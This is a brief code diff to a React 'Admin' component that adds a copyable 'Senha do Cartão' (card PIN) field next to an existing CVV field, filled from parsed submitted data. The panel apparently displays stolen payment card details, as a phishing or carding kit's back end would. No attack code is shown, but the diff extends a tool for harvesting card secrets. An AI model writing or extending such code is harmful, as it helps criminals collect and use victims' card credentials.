@@ -598,6 +598,11 @@ const Admin = () => {
                       fieldName="CVV"
                     />
                   </div>
+                  <CopyableField
+                    label="Senha do Cartão"
+                    value={parsedData.senhaCartao}
+                    fieldName="Senha"
+                  />
                 </div>
               </div>
 
